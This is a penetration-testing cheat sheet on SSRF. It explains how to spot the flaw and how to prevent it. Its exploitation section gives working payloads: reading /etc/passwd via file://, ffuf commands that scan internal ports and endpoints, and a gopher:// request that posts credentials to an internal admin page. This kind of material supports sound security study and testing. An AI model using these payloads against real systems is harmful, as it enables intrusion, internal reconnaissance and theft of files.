# SSRF

## Overview

Server-Side Request Forgery (SSRF) vulnerabilities allow an attacker to make the server-side application send HTTP (or other protocol) requests to an arbitrary destination of the attacker's choosing. This can be used to access internal resources, scan internal networks, interact with cloud metadata services, or bypass access controls.

## Attack Surface

- Features that fetch remote content (URL shorteners, webhooks, image/document fetchers, PDF generators).
- Parameters that accept URLs for backend processing (`url=`, `server=`, `callback=`, etc.).
- APIs or applications that proxy requests on behalf of users.

## Identification

- Locate functionality that makes outbound requests based on user input.
- Test by pointing the parameter at an attacker-controlled server (Burp Collaborator or netcat listener).
- Try `http://127.0.0.1/` or internal IPs to see if responses differ.
- Change protocols (`file://`, `gopher://`) and observe behaviour.
- Look for error messages that reveal internal network details.

## Exploitation

### Basic SSRF

Change a backend URL parameter to point at attacker infrastructure or internal services:
```
dateserver=http://127.0.0.1/index.php&date=...
```

Confirm by receiving a callback on your listener.

### Internal Access and LFI via SSRF

```
dateserver=file:///etc/passwd&date=...
```

### Port Scanning

Use the vulnerable parameter to scan internal ports:
```bash
seq 1 10000 > ports.txt
ffuf -w ./ports.txt -u http://target/index.php -X POST -d "dateserver=http://127.0.0.1:FUZZ/&date=..." -fr "Failed to connect to"
```

### Fuzzing Internal Endpoints

```bash
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://target/index.php -X POST -d "dateserver=http://internal/FUZZ.php&date=..." -fr "Server at ..."
```

### Advanced Protocols (Gopher)

Gopher can be used to craft raw requests to other services (HTTP POST, Redis, MySQL, SMTP, etc.).

Example for POSTing to an internal admin endpoint:
```
dateserver=gopher://internal:80/_POST%20/admin.php%20HTTP/1.1%0D%0AHost:%20internal%0D%0AContent-Length:%2013%0D%0A...adminpw=admin
```

Tools like Gopherus help generate these payloads.

### Blind SSRF

- Confirm via out-of-band callbacks (DNS/HTTP).
- Differentiate open/closed ports or existing files using timing or error message variations.
- LFI attempts via `file://` may produce different responses for existing vs non-existing files.

### Protocols to Test

- `http://` / `https://`
- `file://` (for local file read)
- `gopher://` (raw request crafting)
- Others depending on backend libraries (dict, ldap, etc.)

## Impact

- Access to internal network services and resources
- Retrieval of cloud instance metadata (e.g., AWS IMDS)
- Port scanning and reconnaissance of internal infrastructure
- Exploitation of internal applications (e.g., admin panels)
- Data exfiltration or remote code execution via chained vulnerabilities

## Prevention

- Whitelist allowed domains/protocols and destinations.
- Disable unnecessary URL schemes and protocols in the backend.
- Use network segmentation and firewalls to limit what the application server can reach.
- Avoid sending raw user-controlled URLs to backend fetch functions.
- Implement proper input validation and sanitization.
- Use allowlists rather than denylists for destinations.

## Tools & Payloads

- Burp Collaborator / Interactsh for OAST confirmation
- ffuf for port and endpoint fuzzing
- Gopherus for crafting advanced protocol payloads
- netcat or Python simple HTTP server for basic callbacks

**Example port scan command (adapt parameters):**
```bash
seq 1 10000 > ports.txt
ffuf -w ./ports.txt -u http://target/index.php -X POST -d "target=http://127.0.0.1:FUZZ" -fr "connection refused"
```
